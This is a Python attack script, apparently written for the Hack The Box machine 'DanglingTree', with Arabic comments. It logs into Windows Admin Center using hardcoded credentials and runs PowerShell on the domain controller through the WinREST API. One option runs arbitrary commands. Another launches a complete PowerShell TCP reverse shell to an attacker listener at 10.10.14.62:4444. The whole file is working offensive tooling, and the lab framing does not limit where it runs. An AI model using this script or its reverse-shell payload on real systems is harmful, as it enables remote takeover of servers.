#!/usr/bin/env python3
"""
DanglingTree HTB - WAC Login + Reverse Shell Tool
استخدام:
  python3 wac_shell.py --wac https://dc.danglingtree.htb:6600 -u anderson.w -p 'R3dT3am@Acc3ss#01' --shell --lhost 10.10.14.62 --lport 4444
"""

import argparse
import base64
import json
import re
import sys
import uuid
from urllib.parse import unquote

import requests
import urllib3
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def wac_login(wac_url: str, username: str, password: str) -> tuple[requests.Session, str]:
    """تسجيل الدخول إلى WAC وإرجاع الجلسة + XSRF Token."""
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    })

    # 1. الحصول على CSRF token من صفحة تسجيل الدخول
    r = s.get(f"{wac_url}/", timeout=15)
    if r.status_code not in (200, 403):
        r.raise_for_status()
    m = re.search(r'name="csrf"[^>]+value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("لم يتم العثور على CSRF token في صفحة تسجيل الدخول")
    csrf = m.group(1)

    # 2. الحصول على المفتاح العام (JWK) من WAC
    r = s.post(f"{wac_url}/api/user/key", json={"csrf": csrf}, timeout=15)
    r.raise_for_status()
    jwk = r.json()["jwk"]

    e = int.from_bytes(base64.urlsafe_b64decode(jwk["e"] + "=="), "big")
    n = int.from_bytes(base64.urlsafe_b64decode(jwk["n"] + "=="), "big")
    pub = RSAPublicNumbers(e, n).public_key()

    # 3. تشفير بيانات الاعتماد باستخدام RSA-OAEP-256
    payload = json.dumps({"username": username, "password": password, "csrf": csrf})
    encrypted = pub.encrypt(
        payload.encode(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    # 4. إرسال بيانات الاعتماد المشفرة
    r = s.post(
        f"{wac_url}/api/user/login",
        json={"packet": base64.b64encode(encrypted).decode(), "csrf": csrf},
        timeout=15,
    )
    r.raise_for_status()

    # 5. استخراج XSRF-TOKEN من الكوكيز
    xsrf_raw = s.cookies.get("XSRF-TOKEN", "") or ""
    xsrf = unquote(xsrf_raw)
    if not xsrf:
        raise RuntimeError("XSRF-TOKEN غير موجود بعد تسجيل الدخول")
    return s, xsrf


def run_ps_on_dc(
    s: requests.Session,
    xsrf: str,
    wac_url: str,
    ps_script: str,
    node: str = "dc",
) -> dict:
    """تنفيذ سكربت PowerShell على الخادم عبر WinREST."""
    encoded = base64.b64encode(ps_script.encode("utf-16le")).decode()
    command = f"powershell -EncodedCommand {encoded} 2>&1"

    session_id = str(uuid.uuid4())
    url = f"{wac_url}/api/services/WinREST/PowerShell/nodes/{node}/pssessions/{session_id}"

    r = s.put(
        url,
        json={"properties": {"script": command}},
        headers={"x-xsrf-token": xsrf, "Content-Type": "application/json"},
        timeout=60,
    )
    r.raise_for_status()
    return r.json()


def parse_winrest_output(data: dict) -> str:
    """استخراج المخرجات من استجابة WinREST."""
    props = data.get("properties", data) if data else {}
    results = props.get("results") or []
    errors = props.get("errors") or []

    out_lines = []
    for item in results:
        if isinstance(item, str):
            out_lines.append(item)
        elif isinstance(item, dict):
            out_lines.append(item.get("value", "") or item.get("toString", ""))

    for err in errors:
        msg = err.get("message", "") if isinstance(err, dict) else str(err)
        out_lines.append(f"[ERROR] {msg}")

    return "\n".join(out_lines).strip()


def build_reverse_shell_ps(lhost: str, lport: int) -> str:
    """بناء سكربت PowerShell لـ Reverse Shell."""
    return f'''
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''


def build_check_ps() -> str:
    """سكربت للتحقق من الوصول إلى SmarterMail."""
    return '''
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Content-Type", "application/json")
try {
    $r = $wc.DownloadString("http://localhost:17017/api/v1/auth/login-settings")
    Write-Output "REACHABLE"
    Write-Output $r
} catch {
    Write-Output "ERROR: $($_.Exception.Message)"
}
'''


def main():
    parser = argparse.ArgumentParser(
        description="WAC Login + Reverse Shell Tool for DanglingTree"
    )
    parser.add_argument("--wac", default="https://dc.danglingtree.htb:6600", help="WAC URL")
    parser.add_argument("-u", "--user", default="anderson.w", help="WAC username")
    parser.add_argument("-p", "--pass", dest="password", default="R3dT3am@Acc3ss#01", help="WAC password")

    # خيارات الأوامر
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--check", action="store_true", help="Only check SmarterMail reachability")
    group.add_argument("--shell", action="store_true", help="Execute reverse shell")
    group.add_argument("--command", help="Execute arbitrary PowerShell command")

    # خيارات الشيل
    parser.add_argument("--lhost", default="10.10.14.62", help="Listener IP (tun0)")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port")
    parser.add_argument("--node", default="dc", help="WAC node name")

    args = parser.parse_args()

    print(f"[*] WAC URL: {args.wac}")
    print(f"[*] User: {args.user}")

    # تسجيل الدخول
    print("[*] Logging into WAC...")
    try:
        s, xsrf = wac_login(args.wac, args.user, args.password)
        print("[+] WAC login successful, XSRF token obtained")
    except Exception as e:
        print(f"[-] WAC login failed: {e}")
        sys.exit(1)

    # تحديد سكربت PowerShell
    if args.check:
        ps_script = build_check_ps()
        print("[*] Checking SmarterMail reachability...")
    elif args.shell:
        if not args.lhost or not args.lport:
            print("[-] Please specify --lhost and --lport for reverse shell")
            sys.exit(1)
        ps_script = build_reverse_shell_ps(args.lhost, args.lport)
        print(f"[*] Sending reverse shell to {args.lhost}:{args.lport}...")
    else:
        ps_script = args.command
        print(f"[*] Executing command: {ps_script}")

    # تشغيل السكربت على الخادم
    print("[*] Running PowerShell on DC via WAC WinREST...")
    try:
        data = run_ps_on_dc(s, xsrf, args.wac, ps_script, node=args.node)
        output = parse_winrest_output(data)
    except Exception as e:
        print(f"[-] WinREST execution failed: {e}")
        sys.exit(1)

    print("[*] Raw output:")
    print(output)

    if args.check:
        print("[*] Check complete.")
    else:
        print("\n[+] Command executed successfully.")
        if args.shell:
            print(f"[+] Reverse shell sent! Listen on nc -lvnp {args.lport}")


if __name__ == "__main__":
    main()
